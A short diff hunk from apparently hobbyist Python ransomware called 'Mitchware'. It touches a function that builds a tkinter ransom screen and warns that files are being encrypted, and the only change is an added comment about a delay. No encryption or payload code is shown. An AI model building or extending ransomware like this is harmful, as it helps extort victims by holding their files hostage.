@@ -69,8 +69,8 @@ def encryptor():
 
 def Ransom_Screen():#This creates a tkinter ransompage
 
-        time.sleep(7.5)
-
+        time.sleep(7.5)#This gives the program 7.5 seconds after execution for the ransom page to load
+        
         messagebox.showwarning("Mitchware.py", "Mitchware is encrypting your important files")
 
         mitchRansomware = Tk()
